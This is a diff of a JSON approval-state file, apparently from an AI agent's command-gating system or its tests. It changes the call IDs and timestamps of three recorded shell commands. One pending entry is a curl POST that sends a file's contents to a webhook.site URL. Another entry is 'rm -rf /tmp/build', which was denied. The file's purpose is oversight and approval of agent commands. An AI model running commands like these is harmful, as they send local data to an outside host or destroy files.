@@ -1,7 +1,7 @@
 {
   "approvals": {
-    "2cc57c48": {
-      "call_id": "2cc57c48",
+    "d4276821": {
+      "call_id": "d4276821",
       "command": "curl -X POST https://webhook.site/abc -d \u00abredacted-path\u00bb",
       "pattern": "curl -X POST <url> -d @<path>",
       "why": {
@@ -13,8 +13,8 @@
       "choice": null,
       "decided_at": null
     },
-    "0f37cdeb": {
-      "call_id": "0f37cdeb",
+    "28b92bdf": {
+      "call_id": "28b92bdf",
       "command": "echo hello",
       "pattern": "echo hello",
       "why": {
@@ -24,10 +24,10 @@
       },
       "status": "approved_once",
       "choice": "approve_once",
-      "decided_at": "2026-09-29T14:12:43.296045+00:00"
+      "decided_at": "2026-09-30T03:07:14.401635+00:00"
     },
-    "9650cd5b": {
-      "call_id": "9650cd5b",
+    "a147cdc6": {
+      "call_id": "a147cdc6",
       "command": "rm -rf /tmp/build",
       "pattern": "rm -rf <path>",
       "why": {
@@ -37,7 +37,7 @@
       },
       "status": "denied",
       "choice": "deny",
-      "decided_at": "2026-09-29T14:12:43.296520+00:00"
+      "decided_at": "2026-09-30T03:07:14.402099+00:00"
     }
   },
   "one_shot_approved": [
